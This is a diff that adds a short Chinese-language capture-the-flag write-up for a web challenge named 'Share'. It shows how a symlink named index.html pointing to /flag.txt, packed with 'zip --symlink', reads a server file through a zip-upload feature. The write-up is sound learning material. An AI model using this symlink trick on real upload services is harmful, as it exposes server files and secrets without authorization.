@@ -15,6 +15,21 @@ categories: CTF
 ## Web
 
 ### Share
+網站提供上傳zip檔案
+![](https://i.imgur.com/FrnF7gx.png)
+
+Source
+檢查zip內是否包含index.html,並將內容放到/static/<username>/index.html
+![](https://i.imgur.com/1vcNbXM.png)
+
+透過docker-compose.yaml，發現檔案在/flag.txt
+![](https://i.imgur.com/lux3aQ3.png)
+
+使用Symbolic link將./index.html連結到/flag.txt
+```
+ln -s /flag.txt index.html
+zip --symlink test.zip index.html
+```
 
 ### Gist
 
